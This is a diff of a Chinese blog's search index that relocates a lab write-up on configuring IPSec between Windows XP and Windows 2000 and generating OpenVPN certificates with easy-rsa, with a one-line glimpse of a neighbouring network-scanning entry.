+<p>只在一端配置时，ping 端会直接显示 Request timed out。双端配置时，会显示 Negotiating IP Security。正确配置时，会先显示 Negotiating IP Security，然后才会显示 ping 的 reply，代表双端成功建立了连接。可以在 win2000 端的 IP 安全监视器中看到连过来的 xp 设备。</p>
+ <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/05/experiments/security/web/vpn/8.png" class="" title="只配置了一边"></div><div class="group-picture-column"><img data-src="/2019/12/05/experiments/security/web/vpn/9.png" class="" title="双端配置"></div><div class="group-picture-column"><img data-src="/2019/12/05/experiments/security/web/vpn/10.png" class="" title="完全正确的配置"></div></div></div> 
+ <img data-src="/2019/12/05/experiments/security/web/vpn/11.png" class="" title="查看链接的Windows XP设备">
+ <div class="note info"><p>当然，也可以配置专用的 IPSec 安全策略，不使用系统默认值。过程类似，不再赘述。</p>
+</div>
+</li>
+</ol>
+<h3 id="OpenVPN配置">OpenVPN 配置</h3>
+<div class="note info"><p>本部分实验使用 WindowsXP 和 Windows2000 共同完成，WindowsXP 充当服务端，Windows2000 充当客户端。</p>
+</div>
+<div class="note warning"><p>事先下载安装好 openssl 库，否则会报 “命令不存在” 的错误。</p>
+</div>
+<ol>
+<li>
+<p>首先安装 OpenVPN。安装过程一路下一步即可。</p>
+</li>
+<li>
+<p>将安装目录 easy-rsa 下 <code>vars.bat.sample</code> 文件换成自己的信息，然后更名为 <code>vars.bat</code>。</p>
+ <figure class="highlight shell"><figcaption><span>vars.bat</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">...</span><br><span class="line">set &lt;KEY&gt;=&lt;VALUE&gt;</span><br></pre></td></tr></tbody></table></figure>
+ <img data-src="/2019/12/05/experiments/security/web/vpn/12.png" class="">
+</li>
+<li>
+<p>将 <code>openssl.cnf.sample</code> 更名为 <code>openssl.cnf</code>。 <img data-src="/2019/12/05/experiments/security/web/vpn/13.png" class=""></p>
+</li>
+<li>
+<p>在 easy-rsa 文件夹下，先后运行 <code>vars</code> 和 <code>clean-all.bat</code> 命令，以进行初始化。 <img data-src="/2019/12/05/experiments/security/web/vpn/14.png" class=""></p>
+</li>
+<li>
+<p>生成 CA 根证书。 <img data-src="/2019/12/05/experiments/security/web/vpn/15.png" class=""></p>
+</li>
+<li>
+<p>生成密钥交换协议算法参数。 <img data-src="/2019/12/05/experiments/security/web/vpn/16.png" class=""></p>
+</li>
+<li>
+<p>生成服务端和客户端证书并签发十年有效期。</p>
+ <div class="tabs" id="certificate"><ul class="nav-tabs"><li class="tab active"><a href="#certificate-1">server</a></li><li class="tab"><a href="#certificate-2">client</a></li></ul><div class="tab-content"><div class="tab-pane active" id="certificate-1"><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">build-server-key.bat server</span><br></pre></td></tr></tbody></table></figure>
+<p><img data-src="/2019/12/05/experiments/security/web/vpn/17-1.png" class=""> <img data-src="/2019/12/05/experiments/security/web/vpn/17-2.png" class=""></p></div><div class="tab-pane" id="certificate-2"><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">build-key.bat client</span><br></pre></td></tr></tbody></table></figure>
+<p><img data-src="/2019/12/05/experiments/security/web/vpn/18-1.png" class=""> <img data-src="/2019/12/05/experiments/security/web/vpn/18-2.png" class=""></p></div></div></div>
+</li>
+<li>
+<p>生成 ta key</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>实验</category>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网络扫描</title>
     <url>/2019/11/09/experiments/security/web/webscan/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="目标">目标</h2>
@@ -6082,93 +6177,6 @@ set payload "payload_name"可以设定使用的payload，show options可以查�
 <li>
 <p>中间服务探测的过程与 intense 扫描基本一致，后期 vulners 检测工具与它自己的服务器进行了交互，可能是为了将特征与自己的数据库比对。</p>
  <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/ex5.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/ex6.png" class=""></div></div></div>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>实验</category>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>网络安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>虚拟专用网实验</title>
-    <url>/2019/12/05/experiments/security/web/vpn/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="目标">目标</h2>
-<p>了解什么是虚拟专用网（VPN），知道 VPN 的原理和应用。通过实验理解 IPSec 和 VPN 的关系和必要性。</p>
-<span id="more"></span>
-<div class="note danger"><p>本篇文章为实验记录，仅供交流学习使用，切勿违法应用，所有文中提到的工具不提供下载。</p>
-</div>
-<h2 id="原理">原理</h2>
-<h3 id="虚拟专用网-VPN-1">虚拟专用网 (VPN)[^1]</h3>
-<p>虚拟专用网（Virtual Private Network，VPN）是利用 Internet 等公共网络的基础设施，通过隧道技术，为用户提供的与专用网络具有相同通信功能的安全数据通道。“虚拟” 是指用户无需建立各自专用的物理线路，而利用 Internet 等公共网络资源和设备建立一条逻辑上的专用数据通道，并实现与专用数据通道相同的通信功能。“专用网络” 是指虚拟出来的网络并非任何连接在公共网络上的用户都能使用，只有经过授权的用户才可使用。</p>
-<p>该通道内传输数据经过加密和认证，可保证传输内容的完整性和机密性。</p>
-<h3 id="IPSec">IPSec</h3>
-<p>互联网安全协议（英语：Internet Protocol Security，缩写为 IPsec），是一个协议包，通过对 IP 协议的分组进行加密和认证来保护 IP 协议的网络传输协议族（一些相互关联的协议的集合）。由认证头（AH）、封装安全载荷（ESP）、安全关联（SA）组成。</p>
-<p>IPSec 被设计用来提供入口之间和端到端之间的通信安全，无论哪一种模式都可以用来构建虚拟专用网（VPN）。</p>
-<h2 id="步骤和关键技术">步骤和关键技术</h2>
-<h3 id="IPSec协议配置">IPSec 协议配置</h3>
-<div class="note info"><p>Windows XP 端的 IP 为 192.168.235.136，Windows 2000 端的 IP 为 192.168.235.141</p>
-</div>
-<ol>
-<li>
-<p>在 WindowsXP 下打开 “控制面板→管理工具→本地安全策略”，找到 “IP 安全策略，在本地计算机”。双击进入。然后右击 “安全服务器”，点击指派规则。<img data-src="/2019/12/05/experiments/security/web/vpn/1.png" class=""> <img data-src="/2019/12/05/experiments/security/web/vpn/2.png" class=""></p>
-</li>
-<li>
-<p>双击 “安全服务器” 进入其设置，双击 “所有 ICMP 通讯量” 进入规则设置。<img data-src="/2019/12/05/experiments/security/web/vpn/3.png" class=""></p>
-</li>
-<li>
-<p>在 “筛选器操作” 选项卡中，选择 “需要安全”。<img data-src="/2019/12/05/experiments/security/web/vpn/4.png" class=""></p>
-</li>
-<li>
-<p>在 “身份验证方法” 选项卡中，添加一个共享密钥。记住此密钥，在另一端要做同样的设置。 <img data-src="/2019/12/05/experiments/security/web/vpn/5.png" class="" title="身份验证方法选项卡"></p>
- <div class="tabs" id="key"><ul class="nav-tabs"><li class="tab active"><a href="#key-1">XP 端</a></li><li class="tab"><a href="#key-2">2000 端</a></li></ul><div class="tab-content"><div class="tab-pane active" id="key-1"><img data-src="/2019/12/05/experiments/security/web/vpn/6.png" class="" title="设置共享密钥"></div><div class="tab-pane" id="key-2"><img data-src="/2019/12/05/experiments/security/web/vpn/7.png" class="" title="设置共享密钥"></div></div></div>
-</li>
-<li>
-<p>只在一端配置时，ping 端会直接显示 Request timed out。双端配置时，会显示 Negotiating IP Security。正确配置时，会先显示 Negotiating IP Security，然后才会显示 ping 的 reply，代表双端成功建立了连接。可以在 win2000 端的 IP 安全监视器中看到连过来的 xp 设备。</p>
- <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/05/experiments/security/web/vpn/8.png" class="" title="只配置了一边"></div><div class="group-picture-column"><img data-src="/2019/12/05/experiments/security/web/vpn/9.png" class="" title="双端配置"></div><div class="group-picture-column"><img data-src="/2019/12/05/experiments/security/web/vpn/10.png" class="" title="完全正确的配置"></div></div></div> 
- <img data-src="/2019/12/05/experiments/security/web/vpn/11.png" class="" title="查看链接的Windows XP设备">
- <div class="note info"><p>当然，也可以配置专用的 IPSec 安全策略，不使用系统默认值。过程类似，不再赘述。</p>
-</div>
-</li>
-</ol>
-<h3 id="OpenVPN配置">OpenVPN 配置</h3>
-<div class="note info"><p>本部分实验使用 WindowsXP 和 Windows2000 共同完成，WindowsXP 充当服务端，Windows2000 充当客户端。</p>
-</div>
-<div class="note warning"><p>事先下载安装好 openssl 库，否则会报 “命令不存在” 的错误。</p>
-</div>
-<ol>
-<li>
-<p>首先安装 OpenVPN。安装过程一路下一步即可。</p>
-</li>
-<li>
-<p>将安装目录 easy-rsa 下 <code>vars.bat.sample</code> 文件换成自己的信息，然后更名为 <code>vars.bat</code>。</p>
- <figure class="highlight shell"><figcaption><span>vars.bat</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">...</span><br><span class="line">set &lt;KEY&gt;=&lt;VALUE&gt;</span><br></pre></td></tr></tbody></table></figure>
- <img data-src="/2019/12/05/experiments/security/web/vpn/12.png" class="">
-</li>
-<li>
-<p>将 <code>openssl.cnf.sample</code> 更名为 <code>openssl.cnf</code>。 <img data-src="/2019/12/05/experiments/security/web/vpn/13.png" class=""></p>
-</li>
-<li>
-<p>在 easy-rsa 文件夹下，先后运行 <code>vars</code> 和 <code>clean-all.bat</code> 命令，以进行初始化。 <img data-src="/2019/12/05/experiments/security/web/vpn/14.png" class=""></p>
-</li>
-<li>
-<p>生成 CA 根证书。 <img data-src="/2019/12/05/experiments/security/web/vpn/15.png" class=""></p>
-</li>
-<li>
-<p>生成密钥交换协议算法参数。 <img data-src="/2019/12/05/experiments/security/web/vpn/16.png" class=""></p>
-</li>
-<li>
-<p>生成服务端和客户端证书并签发十年有效期。</p>
- <div class="tabs" id="certificate"><ul class="nav-tabs"><li class="tab active"><a href="#certificate-1">server</a></li><li class="tab"><a href="#certificate-2">client</a></li></ul><div class="tab-content"><div class="tab-pane active" id="certificate-1"><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">build-server-key.bat server</span><br></pre></td></tr></tbody></table></figure>
-<p><img data-src="/2019/12/05/experiments/security/web/vpn/17-1.png" class=""> <img data-src="/2019/12/05/experiments/security/web/vpn/17-2.png" class=""></p></div><div class="tab-pane" id="certificate-2"><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">build-key.bat client</span><br></pre></td></tr></tbody></table></figure>
-<p><img data-src="/2019/12/05/experiments/security/web/vpn/18-1.png" class=""> <img data-src="/2019/12/05/experiments/security/web/vpn/18-2.png" class=""></p></div></div></div>
-</li>
-<li>
-<p>生成 ta key</p>
 </li>
 </ol>
 ]]></content>
